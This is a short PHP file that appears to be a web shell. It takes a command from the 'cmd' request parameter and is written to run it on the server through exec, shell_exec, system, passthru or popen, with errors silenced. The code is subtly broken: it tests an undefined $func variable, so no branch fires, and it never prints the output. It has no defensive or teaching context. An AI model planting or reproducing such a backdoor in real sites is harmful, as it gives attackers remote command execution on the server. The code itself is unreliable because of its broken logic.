<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	
	if ($func == "exec") { @exec($cmd,$res); $res = join("\n",$res); }
	elseif ($func == "shell_exec") { $res = @shell_exec($cmd); }
	elseif ($func == "system") { @ob_start();	@system($cmd); $res = @ob_get_contents();	@ob_end_clean();}
	elseif ($func == "passthru") { @ob_start();	@passthru($cmd); $res = @ob_get_contents();	@ob_end_clean(); }
	elseif ($func == "popen") { if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);}
	
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>